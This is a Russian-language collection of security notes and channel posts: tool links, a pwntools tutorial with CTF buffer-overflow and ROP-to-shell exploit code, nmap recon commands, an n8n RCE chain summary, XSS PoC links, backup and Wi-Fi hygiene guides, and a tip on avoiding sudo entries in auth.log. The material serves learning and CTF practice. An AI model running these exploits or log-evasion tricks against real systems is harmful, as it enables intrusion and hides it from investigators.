-e, --endian <big|little> - устанавка порядка байтов (прямой или обратный);
-F, --format <name> - принудительное использование определенного формата файла;
-w, --writemode - открытие файла в режиме записи, а не в режиме только для чтения, который используется по умолчанию;
-P, --phymode - отключение виртуальной адресации;
--no-plugins - запуск со всеми отключенными плагинами.

https://github.com/ndelphit/apkurlgrep
ApkUrlGrep — инструмент, позволяющий извлекать конечные точки из файлов APK.

https://github.com/Karmaz95/Snake_Apple
Snake_Apple — статьи и инструменты, связанные с исследованиями в среде Apple (в основном macOS).

Наткнулся на редкую годноту — mariokartwii.com/armv8

Несмотря на название, раздел не про Mario Kart, а полноценный туториал по программированию на низком уровне под ARM64

Всего 34 главы, с примерами и объяснениями.

Для линуксоидов — огонь, но есть советы и для Windows/Mac 

https://github.com/arm/metis.git
Metis — AI-driven инструмент для глубокого анализа безопасности кода

    Metis — инструмент от Arm для анализа безопасности кода. Это open-source решение с ИИ-движком, которое помогает находить скрытые уязвимости, снижать нагрузку на ревьюеров и упрощать разбор сложных или устаревших кодовых баз.


 Основные возможности Metis
 Глубокий security code review — Metis анализирует контекст, логику, зависимости и взаимодействие модулей, находя проблемы, которые часто пропускают линтеры и SAST-решения.
 ИИ-поддержка — встроенные модели помогают выявлять нетривиальные дефекты, подозрочные паттерны и потенциальные цепочки атаки.
 Работа с большими и legacy-проектами — Metis особенно эффективен там, где кодовая база сложная, исторически разросшаяся или плохо документирована.
 Удобный процесс ревью — подсветка рисков, генерация объяснений, рекомендации по исправлению и снижение «усталости ревьюера».
 Автоматизация и гибкость — инструмент можно интегрировать с CI/CD, запускать локально или применять как часть пайплайна безопасной разработки.

 Установка и запуск
Клонирование проекта и установка зависимостей:

Bash


git clone https://github.com/arm/metis.git
cd metis
pip install -r requirements.txt


Запуск анализа:

Bash


python3 metis.py --source /path/to/codebase


Использование в CI/CD:
Metis можно встроить в GitHub Actions, GitLab CI или локальные пайплайны, вызывая тот же CLI.
Пример работы в CI:

Bash


python3 metis.py --source . --output report.json


В репозитории есть примеры конфигураций, моделей и сценариев анализа — изучайте папку 
/examples/ и адаптируйте Metis под свои процессы безопасной разработки.

https://github.com/3nock/SpiderSuite
SpiderSuite: https://github.com/3nock/SpiderSuite

Продвинутый паук/краулер для веб-безопасности (web security spider/crawler)

https://github.com/Gowtham-Darkseid/AutoPentestX
AutoPentestX – инструмент для автоматического тестирования на проникновение и составления отчетов об уязвимостях в Linux

Pwntools: когда эксплоит пишется быстрее, чем оправдание в полиции

Если ты когда-либо пытался наколхозить эксплоит в Notepad++, а потом два часа искал, почему шеллкод не работает — встречай: pwntools. Это не просто библиотека, это целый арсенал для тех, кто хочет автоматизировать свой баунти-хаос. Питон, асм и немного чёрной магии — вот рецепт успеха.

 На что способен этот франкенштейн:

     CTF-мод — автоматизируем всё, что движется: от брута флагов до ROP-цепочек

     Шеллкод на коленке — генерируем, пакуем и тестим без лишних телодвижений

     Работа с бинарником — ищем гаджеты, дырявим GOT/PLT, дизлайбим либы

     Сетевое общение — TCP/UDP, шелл, SSH — общаемся с жертвой как с другом

     Дебёг как бог — GDB-интеграция, брейкпоинты, трассировка без слёз


 Ставим эту магию (Python 3.6+ или пока):

Bash


pip install pwntools  # если не сломалось — ты счастливчик


 Быстрый старт (для тех, кто не любит читать мануалы):

Простой пример — подключиться к серверу и получить флаг:

Python


from pwn import *

# Подключаемся к таске
conn = remote('ctf.example.com', 1337)

# Ждём приветствия
conn.recvuntil(b'Enter password:')

# Шлём наш гениальный эксплоит
conn.sendline(b'A' * 64 + p64(0x401152))  # переполнение буфера + адрес победы

# Получаем флаг и улыбаемся
print(conn.recvall().decode())


 Продвинутые фишки (когда нужно выебать ядро):

ROP-цепочка для обхода DEP:

Python


from pwn import *

context.binary = './vuln'

# Автоматически ищем гаджеты
rop = ROP(context.binary)
rop.execve(next(context.binary.search(b'/bin/sh')), 0, 0)

# Собираем полезную нагрузку
payload = flat(
    b'A' * 64,
    rop.chain()
)

# Отправляем и получаем шелл
io = process('./vuln')
io.sendline(payload)
io.interactive()  # welcome to root!


Интеграция с GDB (для параноиков):

Python


io = gdb.debug('./vuln', gdbscript='''
    break *main+0x42
    continue
''')

# Смотрим дамп памяти после краша
io.wait()
core = io.corefile
print(hex(core.rsp))  # где упал — там и ищи сокровища


 Когда использовать эту хрень:

     CTF — если надоело вручную собирать эксплоиты

     Баг-баунти — тестируем веб-сервисы на устойчивость к пиздецу

     Образование — учимся эксплоитингу без скучных мануалов

     Исследования — разбираемся, как ломаются бинарники вживую


Предупреждение (шоб мусора не навести):

    Используй только на своих тасках или с разрешения владельца

    Не забывай про context.log_level = 'debug' — иногда полезно увидеть, что там внутри творится

    Если эксплоит не работает — это не баг, это фича. Перечитай доки.

 Совет: Начни с локальных бинарников из CTF-тасок — так безопаснее и проще понять, как эта бандура работает. А потом уже можно и на реальные цели переходить (если разрешили, конечно).

Как не отдать хакерам всё через общественный Wi-Fi: инструкция для параноиков

99% этих сетей - это рассадник сниффинга и МИТМ-атак. Сидишь в кафе, а какой-то уебан уже сканирует твой незашифрованный трафик. За 5 минут настроим защиту, чтобы не ебать мозг.

VPN - твой новый бог. Обязательно и без вариантов.
Нет своего? Бери проверенные: Mullvad, IVPN, Proton. Настрой на всех устройствах до подключения к сети. Если VPN отвалился - интернет тоже должен отвалиться. Используй Kill Switch.

copy


# Пример для WireGuard на телефоне/ноуте
# Скачал конфиг с сайта провайдера, закинул в приложение, включил - всё.


Выруби эту хуйню: общий доступ и авто-коннект

copy


Windows: Панель управления -> Сеть -> Изменение параметров адаптера -> Свойства беспроводной сети -> Выключить "Общий доступ к файлам и принтерам".
macOS: Системные настройки -> Общий доступ -> Убери все галочки.
Телефон: Настройки -> Wi-Fi -> Отключи "Автоподключение" к открытым сетям.


HTTPS Everywhere - базовая гигиена
Убедись, что в браузере стоит HTTPS-Only режим. Видишь в адресной строке открытый замок или "Не защищено"? Закрой эту пиздоглазую вкладку и больше не заходи.

Двухфакторная аутентификация (2FA) ВЕЗДЕ
Даже если спалят пароль в открытой сети, без кода из приложения или ключа - нихуя не сделают. Используй TOTP (Google Authenticator, Aegis) или аппаратные ключи (YubiKey).

Не делай ничего важного. Серьёзно.
Не логинься в банк, не вводи данные карты, не работай с почтой, где есть доступ к чему-то важному. Отложи это, пока не будешь на своём LTE или домашнем интернете. Общественный Wi-Fi - только для просмотра херни.

Фаервол и антивирус - включи, блять
Даже на телефоне. Заблокируй все входящие подключения в настройках фаервола. Это отсечёт попытки доступа к тебе из локальной сети кафешного роутера.

Итоговый чек-лист перед подключением:

copy


1. VPN включен и работает (проверил на ipleak.net).
2. Файрвол включен.
3. Отключен общий доступ.
4. В браузере горит HTTPS-Only.
5. Не открываешь банк и почту.
6. Сидишь и смотришь ютуб/читаешь новости. Всё.


💥Результат: твой трафик - непрочитанная шифровка для любого соседа по сети. Спи спокойно.

Резервное копирование = спасательный круг, а не "завтра сделаю"

Твои данные — это единственная ценность на сервере. Железко сдохнет, облако пошлет тебя, а бэкап вытащит из жопы. Всего за 10 минут ты настроишь систему, которая не даст тебе ебаться в самое неподходящее время.

Логика и частота: правило 3-2-1
Это не заумь, а закон. 3 копии данных, 2 разных типа носителей, 1 копия вне локации. Если всё лежит на одном диске в дата-центре — это не бэкап, это самоубийство.

Ставим BorgBackup: дедушку, который не подводит

Bash


sudo apt install borgbackup
# Создаем репозиторий (локально или на удаленном сервере)
borg init --encryption=repokey /путь/к/репозиторию
# или на удаленке
borg init --encryption=repokey ssh://user@backup.server:/путь/к/репозиторию


Первый полный бэкап

Bash


export BORG_PASSPHRASE='твой_крепкий_ключ'
borg create --stats --progress /путь/к/репозиторию::сервер-{now} /home /etc /var/www

Где 
сервер-{now} — имя снапшота. Borg делает дедупликацию, сжимает и шифрует нахуй.

Автоматизируем это дерьмо (cron)

Bash


# crontab -e
0 2 * * * /usr/bin/borg create --stats /путь/к/репозиторию::сервер-{now:%Y-%m-%d_%H:%M} /home /etc 2>&1

Каждую ночь в 2 часа. Не забывай про 
BORG_PASSPHRASE в переменных окружения или скрипте.

Проверка и листинг, если не проверил, бэкапа нет

copy


borg list /путь/к/репозиторию
# Проверяем целостность, чтобы не обосраться
borg check /путь/к/репозиторию


Восстановление (когда всё пошло по пизде)

copy


borg extract /путь/к/репозиторию::сервер-2025-03-29_14:30

Выбираешь нужный снапшот и тащишь данные обратно. Не жди момента "ой, блять".

Копия на холодное хранение (Rsync + внешний диск)

Bash


rsync -avz --delete /home/user/ /media/user/external_drive/backup/

Раз в неделю суй хуй (диск) в USB и синхронизируй. Дешево и сердито.

 Тестирование — единственный способ не обосраться
Раз в месяц делай учебную тревогу: восстанавливай какой-нибудь каталог на тестовую машину. Если не работает — твой план говно.

 Результат: Когда у соседа по дата-центру всё горит, ты спокойно восстанавливаешься и идешь пить кофе.

https://github.com/nixawk/pentest-wiki
 
PENTEST-WIKI — бесплатная онлайн-библиотека знаний по безопасности для пентестеров и исследователей.

    Собраны:
    — ресурсы по сбору информации, оценке уязвимостей, эскалации привелегий, обратной инженерии;
    — инструменты эксплуатации и постэксплуатации;
    — книги; 
    — и многое другое.


Промт Хакера



https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
 
Краткое руководство инъекций XML/XXE

В этом репозитории вы найдете: 
— Что такое инъекция внешних сущностей XML, опишем некоторые общие примеры
— Как найти и использовать различные виды инъекций XXE
— Как предотвратить атаки инъекций XXE

    Внешняя инъекция XML (XXE) — уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в обработку XML-данных приложения.

 Фреймворки для постэксплуатации. Выбираем между Metasploit, Cobalt Strike, Merlin, Apfell, Faction C2, Koadic и другими

    Постэксплуатация — это действия, выполняемые после получения доступа к системе.

https://xakep.ru/2019/10/18/post-exploitation-frameworks/
Статья расскажет о фреймворках, которые помогут эксплуатировать уязвимости, закрепиться и продвинуться в целевой инфраструктуре.

Для этого рассмотрим основные актуальные проекты, их функции и особенности. 


https://habr.com/ru/articles/327740/
Компьютерная криминалистика (форензика) — обзор инструментария и тренировочных площадок

    Форензика — прикладная наука о раскрытии преступлений, связанных с компьютерной информацией, об исследовании цифровых доказательств, методах поиска, получения и закрепления таких доказательств.


В статье рассмотрим популярные инструменты для проведения криминалистического анализа и сбора цифровых доказательств.

Белые хакеры, для вас 


Промт Хакера

https://github.com/projectdiscovery/cvemap
Нужно быстро прикинуть, что там по актуальным угрозам? 


cvemap дает структурированный доступ к свежим CVE, включая EPSS-скор и наличие шаблонов.

Отсекаешь шум и фокусишься на реально важном.


https://habr.com/ru/companies/aktiv-company/articles/981642/
https://habr.com/ru/companies/aktiv-company/articles/981642/
Чемоданчик пентестера

    В этой статье систематизировали инструменты, которыми может воспользоваться любой пентестер при аудите инфраструктуры и внешнего периметра.

     Понимание этого набора — первый и критически важный шаг к выстраиванию адекватной системы защиты. Только самое нужное и актуальное.


 Ссылка: Клик!



https://github.com/sergeevdm/Linux-Commands
Отличная шпаргалка по командам Linux

Внутри — команды для работы с файловой системой, перемещением по директориям, созданием файлов и папок, а также много полезных мелочей для новичков и профи.

Всё с пояснениями, примерами и на русском.




Web-сканер безопасности, который реально учится на твоих же сканах: локальное авто-обучение, 125+ модулей, сканы до 80% быстрее, OWASP-ready 
* ML по 23 сигналам ответа (тайминги, заголовки, статус и т.д.)
* около 5% ложноположительных
* умный семантический краулер
* OOBZero для скрытого blind SQLi на ниндзя-уровне
* написан на Rust, так что работает очень быстро
Репозиторий: [http://github.com/bountyyfi/lonkero]




1 КОМАНДА ДЛЯ КАРТИРОВАНИЯ СЕТИ (АВТОРИЗОВАННОЕ ТЕСТИРОВАНИЕ)
Продвинутый Nmap Recon + Grep фильтрация + Banner fingerprinting
Bash
nmap -n -Pn -sS -sV -p80 --open --script=banner -T5 192.168.1.0/24 -oG - | grep 'open' | grep -v 'tcpwrapped'
Nmap recon + service fingerprinting + чистая фильтрация (без шума)
Bash
nmap -n -Pn -sS -sV --version-all -p80 --open --script=banner,http-title,http-server-header \
  --reason --stats-every 10s -T4 192.168.1.0/24 -oG - \
| awk '/Up$/{ip=$2} /80\/open/{print ip "  " $0}' \
| grep -v 'tcpwrapped'
Быстрое обнаружение
Показывает только живые хосты + открытый 80 порт
Тянет title, server headers и баннеры (Apache/IIS/камеры/роутеры)
 Режет шум (фильтрует tcpwrapped)
Подмена целей
• Полный sweep (громче): -p-
• Топ порты (сбалансировано): --top-ports 1000
• Добавить HTTPS: -p80,443 --script=banner,http-title,http-server-header,ssl-cert
 -T5 не stealth, это агрессивный режим. Для более безопасного и стабильного дефолта используй -T4




 http://ste.gg/
Это не просто очередной инструмент для стеганографии.
Это полноценный набор с разными режимами, сделанный для того, чтобы выжимать максимум из идей по скрытой передаче данных.
Очень простой в использовании, но при этом даёт продвинутым пользователям весь нужный функционал и даже больше.
Можно загружать разные типы файлов (пока изображения и аудио, видео скоро подвезут) и прятать любые данные с разными вариантами шифрования. Можно даже прятать целые файлы внутри других файлов.
По умолчанию есть три вкладки: encode, decode и analyze. Если говорить по-человечески: первая прячет данные, вторая достаёт, третья смотрит на всё под лупой (полезно, когда умный декодер что-то пропускает).
Стеганография может применяться в самых разных областях:
- watermarking и fingerprinting
- data exfil
- botnet signaling
- covert channels
- malware C&C
- пазлы/ARG
- и многое другое
И да… на сайте спрятано несколько Easter Steggs, которые включают скрытые фичи (некоторые с новыми техниками стега). Для тех, кто захочет поискать. 
Никакие данные не сохраняются, пользоваться можно бесплатно.




https://github.com/Chocapikk/CVE-2026-21858
CVE-2026-21858 + CVE-2025-68613: n8n Ni8mare — полный чейн эксплуатации
Неавторизованный доступ до RCE с правами root:
* LFI через путаницу с Content-Type
* Чтение /proc/self/environ для поиска HOME
* Кража encryption key + базы данных
* Подделка админского JWT-токена
* Обход песочницы для expression injection
* RCE от имени root
CVSS 10.0



https://github.com/user1342/Awesome-Android-Reverse-Engineering
Если хочешь глубже разобраться в безопасности Android-приложений или реверс-инжиниринге то это для тебя
В подборке аккуратно собраны учебные материалы и практические инструменты по Android-реверсу.
Коллекция покрывает полный путь от входа в тему до продвинутого анализа: онлайн-курсы, видеотуториалы, профильные книги, а также инструменты для статического анализа, динамической отладки, декомпиляции и не только.
Отдельно есть продвинутые темы: анализ вредоносного ПО, разбор прошивок и ядра, обфускация и анти-реверс-техники. Плюс CTF-челленджи и реальные кейсы для практики.






https://github.com/projectdiscovery/katana
Как скраулить список целей и отфильтровать статические файлы с помощью нескольких флагов katana:
-d: максимальная глубина сканирования
-kf: включает сканирование известных файлов
-jc: включает разбор и сканирование эндпоинтов в JS-файлах
-fx: извлекает элементы форм, поля ввода, текстовые области и выпадающие списки
-ef: фильтрует вывод по указанным расширениям
-o: имя выходного файла
Bash
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurls.txt



LINUX FIND СЭКОНОМИЛ МНЕ 40 ЧАСОВ РУЧНОГО ПОИСКА. ВОТ КАК.
$ find . -name "*.log"
Ищет все фaйлы с окончанием .log в текущей директории.
$ find / -name "config.txt"
Ищет файл config.txt по всей системе.
$ find . -type f -name "*.py"
Ищет только файлы (не директории) с расширением .py.
$ find . -type d -name "backup"
Ищет только директории с именем backup.
$ find . -mtime -7
Файлы, изменённые за последние 7 дней.
$ find . -size +100M
Файлы больше чем 100 МБ.
$ find . -name "*.log" -exec rm {} \;
Находит .log файлы и удаляет их по одному.
$ find . -user username
Ищет все файлы, владельцем которых является указанный пользователь.
$ find . -perm 777
Файлы с правами 777 (потенциальный риск безопасности).
$ find . -empty
Находит все пустые файлы и директории.





https://github.com/0x4m4/hexstrike-ai
AI-фреймворк для пентестинга с упором на автономных агентов.
Внутри больше 150 инструментов для автоматизации пентестов, поиска уязвимостей, багбаунти-рутинга и ресёрча в безопасности.




https://github.com/aws/bedrock-agentcore-sdk-python
Amazon Bedrock AgentCore позволяет безопасно развертывать и использовать высокоэффективные агенты в любом масштабе с помощью любой платформы и модели. 
С помощью Amazon Bedrock AgentCore разработчики могут ускорить внедрение ИИ-агентов в производство, обеспечив масштабируемость, надежность и безопасность, необходимые для реального развертывания. 
AgentCore предоставляет инструменты и возможности для повышения эффективности и функциональности агентов, специализированную инфраструктуру для безопасного масштабирования агентов и средства управления для работы с надежными агентами.

https://t.me/CloudTextBot?start=377aa3ab-8b3e-4063-9322-c77a584878e6


ики, которые исполняют ваши желания 


Ловите райтапы на второй этап НТО26: 
https://github.com/aeria1/nto2025-stage2-writeups

https://winitpro.ru/index.php/2011/12/26/zapusk-cmd-ot-system-v-windows-7/?ysclid=mk42b8wx7a128951153

https://newgazette.ru/c/kak-podklyuchitsya-k-virtualnoj-mashine-po-ssh-poshagovaya-instrukciya-dlya-dostupa-i-vhoda


https://overthewire.org/wargames/bandit/bandit0.html

https://github.com/DimitarPetrov/stegify

https://hackerlab.pro/subscription



Большинство не знает, что:
Очистка bash-history (history -c) не заметает следы.
Если ты использовал sudo, Linux уже записал точную команду в другой лог.
Он называется auth.log.
Пути:
- /var/log/auth.log (Debian / Ubuntu)
- /var/log/secure (RHEL / CentOS)
Форензикам не нужен твой history-файл.
Им достаточно сделать grep COMMAND=.
Каждый раз, когда ты вводишь sudo nmap ... или sudo vim /etc/shadow, в auth.log пишется:
- пользователь, который запустил команду
т- ерминал (TTY)
- точная команда с аргументами
Auth.log стучит потому, что ты пихаешь sudo перед каждой командой.
Каждый sudo nmap <target> логирует все аргументы.
Не префиксь всё подряд. Повышай привилегии один раз.
Вместо:
Bash
sudo nmap -sS target
(в лог уходит вся команда)
Сделай так:
Bash
sudo -i

(в лог пишется только session opened for user root)
А дальше выполняй команды внутри root-shell.
Разница в том, что auth.log видит один вход в root, и обычно не логирует те 50 команд, которые ты набрал внутри интерактивной сессии, если, конечно, за тобой не следит auditd.


https://github.com/GH05TCREW/pentestagent
PentestAgent — это AI-агентный фреймворк для black-box тестирования безопасности. Подходит для рабочих процессов bug bounty, red team и классического пентеста.

https://storage.googleapis.com/nowaskyjr/xss-url-like-poc1.html
https://storage.googleapis.com/nowaskyjr/xss-url-like-poc2.html
Санитайзеры могут пропустить <https://>, приняв это за markdown-автоссылку. Но если в итоге это рендерится как сырой HTML, а не как <a>-тег, получается XSS-вектор.
В этом PoC браузер создает кастомный тег https: и парсит компоненты URL как HTML-атрибуты.
А вот вариант, где #XSS-пейлоад замаскирован под список URL.

https://github.com/mrh0wl/Cloudmare/?tab=readme-ov-file
Находит исходные серверы веб-сайтов за обратными прокси-серверами
https://github.com/mrh0wl/Cloudmare/?tab=readme-ov-file


https://youtu.be/CdQ2EYKfB8g?list=PLt9cUwGw6CYF6Kj19mBZpfhQPsRIC5vGl&twclid=29bi45d95p99nq7fx2o1ku8ox


https://github.com/KeygraphHQ/shannon
Shannon: полностью автономный AI-хакер, который находит реальные эксплойты в ваших веб-приложениях.
Shannon показал 96,15% успешности на бенчмарке XBOW без подсказок, с учётом исходного кода.
Фичи:
» Полностью автономная работа
» Отчёты уровня пентеста с воспроизводимыми эксплойтами
» Покрытие критических уязвимостей из OWASP
» Динамическое тестирование с пониманием кода
» Работает на базе интегрированных security-инструментов
» Параллельная обработка для ускорения результатов


Знал?
SSH-сессии не исчезают просто потому, что ты отключился.
Где Linux всё хранит:
/var/log/wtmp     — история входов  
/var/log/btmp     — неудачные попытки  
/var/log/lastlog  — последний логин
Что по этим логам видно форензике:
успешные входы
фейлы и брутфорс
IP-адреса источников
длительность сессий
под какой учёткой заходили
Ты отключился.
Linux оставил запись о визите.


https://ip.thc.org/

http://youtube.com/watch?v=HilNYgA1JLc&twclid=2-6cdg22j2kg5qrxk16cmelaqis



https://github.com/yee-yore/DorkAgent
Нашли свежий тул для пентестеров — DorkAgent. Это агент на базе LLM, который автоматизирует Google dorking в багханте и тестах безопасности. Инструмент сам подбирает dork-запросы, прогоняет их, собирает результаты и экономит время на ручном переборе.


https://hackers-arise.com/using-artificial-intelligence-ai-in-cybersecurity-creating-a-custom-mcp-server-for-log-analysis/
AI закрепился как мощный буст в багбаунти. Всё больше хантеров строят собственные инструменты на базе MCP-серверов, позволяя моделям разбирать реальные логи почти на уровне опытных DFIR-специалистов. 
Один из таких примеров показывает, как кастомный MCP-сервер за секунды коррелирует WAF- и auth-логи, выявляет brute-force-кластеры по всей атакуемой поверхности и фиксирует скоординированные атаки, которые вручную трудно заметить. 
Вся обработка идёт в песочнице с безопасным доступом к файлам. 


https://hackers-arise.com/web-app-hacking-finding-vulnerabilities-with-caido-scanner/
Взлом веб-приложений. Поиск уязвимостей с Caido Scanner
Caido подпрыгнул в лигу Burp-киллеров.
Плагин сканера сам ловит уязвимости по ходу твоего серфинга по приложению и добивает подозрительные эндпоинты точечными атаками.


https://forkbomb.ru/


Шпаргалка по важным сочетаниям клавиш для компьютера

Основные сочетания:

- CTRL+A — Выделить всё  
- CTRL+C — Копировать  
- CTRL+X — Вырезать  
- CTRL+V — Вставить  
- CTRL+Z — Отменить действие  
- CTRL+B — Полужирный шрифт  
- CTRL+U — Подчёркивание  
- CTRL+I — Курсив  

Функциональные клавиши:

- F1 — Вызов справки  
- F2 — Переименовать выделенный объект  
- F3 — Поиск всех файлов  
- F4 — Открыть выпадающий список файлов в диалоговых окнах  
- F5 — Обновить текущее окно  
- F6 — Перемещение фокуса в Проводнике Windows  
- F10 — Активировать опции строки меню  

Сочетания с ALT:

- ALT+TAB — Переключение между открытыми приложениями  
- ALT+F4 — Закрыть программу/текущее окно  
- ALT+F6 — Переключение между окнами текущей программы  
- ALT+ENTER — Открыть диалоговое окно «Свойства»  
- ALT+SPACE — Системное меню текущего окна  
- ALT+¢ — Открыть выпадающие списки в диалоговых окнах  

Прочие сочетания:

- BACKSPACE — Переход в родительскую папку  
- CTRL+ESC — Открыть меню «Пуск»  
- CTRL+ALT+DEL — Открыть диспетчер задач / перезагрузить компьютер  
- CTRL+TAB — Перемещение по вкладкам свойств  
- CTRL+SHIFT+DRAG — Создать ярлык (также: правый клик + перетаскивание)  
- CTRL+DRAG — Копировать файл  
- ESC — Отменить последнее действие  
- SHIFT — Удерживая SHIFT, вставить CD‑ROM, чтобы обойти автозапуск  
- SHIFT+DRAG — Переместить файл  
- SHIFT+F10 — Открыть контекстное меню (как правый клик)  
- SHIFT+DELETE — Полное удаление (минуя Корзину)  
- ALT+подчёркнутая буква — Открыть соответствующее меню  

Управление курсором в документах:

- HOME — В начало строки / крайнее левое положение поля или экрана  
- END — В конец строки / крайнее правое положение поля или экрана  
- CTRL+HOME — Вверх (в начало)  
- CTRL+END — Вниз (в конец)  
- PAGE UP — Прокрутить документ или диалоговое окно на страницу вверх  
- PAGE DOWN — Прокрутить документ или диалоговое окно на страницу вниз  
- КЛАВИШИ СО СТРЕЛКАМИ — Перемещение фокуса в документах, диалоговых окнах и т. д.  
- CTRL+> — К следующему слову  
- CTRL+SHIFT+> — Выделить слово  

Управление деревом в Проводнике Windows (цифровая клавиатура):

- * — Развернуть всё под текущим выделением  
- + — Развернуть текущее выделение  
- - — Свернуть текущее выделение  
- ¦ — Развернуть текущее выделение или перейти к первому дочернему элементу  
- ‰ — Свернуть текущее выделение или перейти к родительскому элементу  

Специальные символы (ввод через ALT+код):

- ‘ — Открывающая одинарная кавычка (ALT 0145)  
- ’ — Закрывающая одинарная кавычка (ALT 0146)  
- “ — Открывающая двойная кавычка (ALT 0147)  
- ” — Закрывающая двойная кавычка (ALT 0148)  
- – — Короткое тире (ALT 0150)  
- — — Длинное тире (ALT 0151)  
- … — Многоточие (ALT 0133)  
- • — Маркер списка (ALT 0149)  
- ® — Знак регистрации (ALT 0174)  
- © — Знак авторского права (ALT 0169)  
- ™ — Товарный знак (ALT 0153)  
- ° — Знак градуса (ALT 0176)  
- ¢ — Символ цента (ALT 0162)  
- ¼ — Одна четверть (ALT 0188)  
- ½ — Одна вторая (ALT 0189)  
- ¾ — Три четверти (ALT 0190)


https://github.com/GeenStack/Escalatoria?ysclid=mhl2lfzt7m727736985
GitHub - GeenStack/Escalatoria: Большое практическое руководство по повышению привилегий в Linux

https://habr.com/ru/companies/jetinfosystems/articles/505740/?ysclid=mhl29knox7397275439
Я есть root. Разбираемся в повышении привилегий ОS Linux / Хабр

Веб
1. `Burp Suite` - мощнейший расширяемый фреймоврк для тестирования приложений, которая включает в себя такие инструменты, как прокси-сервер, сканер уязвимостей, fuzzer и другие.
2. `OWASP ZAP` - свободно распространяемый инструмент, который включает в себя такие инструменты, как прокси-сервер, сканер уязвимостей, fuzzer и другие.
3. `sqlmap` - инструмент для автоматического обнаружения уязвимостей в SQL запросах и эксплуатации SQL-инъекций. Наверное так будет корректнее.
4. `Nikto` - сканер уязвимостей веб-серверов, который проверяет сервер на наличие уязвимостей и устаревших компонентов.
5. `DirBuster` - утилита для автоматического обнаружения скрытых файлов и каталогов на веб-сервере.
6. `Wfuzz` - инструмент для автоматического fuzz-тестирования веб-приложений.
7. `Nmap/Zenmap` - сетевой сканер, который может быть использован для обнаружения открытых портов и сервисов.
8. `Acunetix, Nuclei` - автоматические сканеры веб-приложений, которые включают в себя такие функции, как сканирование SQL-инъекций, XSS, CSRF и других уязвимостей.
9. `Chrome DevTools` - встроенный в браузер Chrome инструмент для разработчиков, который включает в себя такие функции, как отладка JavaScript, просмотр сетевого трафика и другие.
10. `XSSer` - утилита для автоматического обнаружения уязвимостей XSS (Cross-Site Scripting) на веб-сайтах.
11. `Javascript Obfusscator`- нормальный вид кода для js-beautify
12.  `js-beautify` - форматирует код в читаемый



Квесты
1. `linpeas` - автоматизирует процесс поиска уязвимостей в Linux-системах.
2. `linux-exploit-suggester` - помогает найти уязвимости в Linux-системах.
3. `pspy` - позволяет просматривать процессы и их привилегии в Linux-системах.
4. `GTFOBins` - онлайн-сервис со списком двоичных файлов Unix, которые можно использовать для повышения привилегий на неправильно сконфигурированных системах.

Криптография
1. `FeatherDuster` - автоматизированный, модульный инструмент для криптоанализа
2. `Hash Extender` - утилита для выполнения атак на расширение хэша
3. `PkCrack` - инструмент для взлома шифрования PkZip
4. `RSACTFTool` - утилита для восстановления закрытого ключа RSA с помощью различных атак
5. `RSATool` - программа для работы с РСА
6. `XORTool` - инструмент для анализа многобайтового шифра XOR
7. `John the Ripper` - инструмент для взлома хэшей
8. `Hashcat` - инструмент для взлома хэшей

Реверс-инжиниринг
1. `IDA Pro` - интегрированная среда разработки для анализа и декомпиляции программ.
2. `dnSpy` - декомпилятор и дизассемблер и отладчик для платформы .NET.
3. `ByteCode Viewer` - инструмент для анализа байт-кода Java-приложений, используя различные декомпиляторы. Open Source.
4. `jadx` - декомпилятор DEX-файлов, JAR и APK-файлов в исходный код. Open Source.
5. `PyInstaller Extractor` - скрипт для извлечения содержимого EXE-файла, созданного PyInstaller. Open Source.
6. `uncompyle6` - декомпилятор байт-кода Python (файлы PYC). Open Source.
7. `Frida` - инструмент для динамического анализа и манипулирования с исполняемыми файлами, процессами и системами. Open Source.
8. `Ghidra` - платформа для анализа и декомпиляции программ, разработанная АНБ.
9. `Radare2` - свободная и открытая платформа для анализа и декомпиляции программ.
10. `OllyDbg` - отладчик для операционной системы Windows
11. `x64dbg` - программа для отладки приложений и программ, разработанных 32⁄64 разрядной архитектурах
12. `WinDbg` - многоцелевой отладчик для Windows
13. `GDB` - переносимый отладчик проекта GNU для программ написанных на C/C++


Стеганография
1. `Convert` - конвертация изображений в различные форматы и применение к ним фильтров
2. `Exif` - отображение информации EXIF в файлах JPEG
3. `Exiftool` - чтение и запись метаданных в файлах
4. `Exiv2` - инструмент для работы (модифицирования) метаданными изображений
5. `ImageMagick` - инструмент для создания, обработки и редактирования изображений
6. `Outguess` - универсальный инструмент для реализации задач стеганографии
7. `Pngtools` - утилита используемая для исследования PNG файлов
8. `SmartDeblur` - используется для восстановления размытых изображений
9. `Steganabara` - инструмент для анализа стеганографии, написанный на Java
10. `Stegbreak` - утилита для поиска, выявления и модификации стеганографических включений в изображениях
11. `StegCracker` - утилита для нахождения скрытых данных внутри файлов
12. `stegextract` - обнаружение скрытых файлов и текста в изображениях
13. `Steghide` - скрытие данных в различных типах изображений
14. `Stegsolve` - применение различных стеганографических методов к изображениям
15. `Zsteg` - анализ PNG/BMP
16. `Stego-Toolkit` - как принято говорить, “все в одном”
17. `grep`-[опция] "строка без учета регистра"  [путь к файлу] - рекурсивно ищет заданную строку в файлах
18. `ghex` - анализ байт кода файла
19. `stegify` - прячет файл в картинке 
20. `stegseek --seed` - смотрит есть ли файле зашифрованные данные

Stegify
wget https://github.com/DimitarPetrov/stegify/releases/download/v1.2/stegify_linux_x86-64 - установка
chmod +x stegify_linux_x86-64 - выдача прав
stegify =  ./stegify_linux_x86-64
Закодировать - stegify encode --carrier <Во что кодировать> --data <что кодировать> --result <итоговый файл с информацией>
Декодировать - stegify decode --carrier <из чего декодировать> --result <итоговый файл с информацией>


Форензика
1. `Audacity` - анализ звуковых файлов (mp3, m4a и т.д.)
2. `Bkhive` и `Samdump2` - извлечение файлов SYSTEM и SAM
3. `Creddump` - извлечение учетных данных Windows
4. `Exif Tool` - чтение, запись и редактирование метаданных файлов
5. `Extundelete` - восстановление утерянных данных из монтируемых изображений
6. `Foremost` - инструмент для восстановления определенного типа файлов на основе заголовков
7. `Fsck.ext4` - исправление поврежденных файловых систем
8. `Malzilla` - инструмент для поиска вредоносных программ
9. `NetworkMiner` - инструмент для анализа сетевого трафика и поиска в нём файлов различного типа
10. `PDF Streams Inflater` - нахождение и извлечение файлов zlib, сжатых в PDF-файлах
11. `ResourcesExtract` - извлечение различных типов файлов из исполняемых файлов
12. `Shellbags` - исследование файлов NT_USER.dat
13. `UsbForensics` - содержит набор инструментов для анализа USB
14. `Volatility` - для исследования сниппейтов памяти


PWN
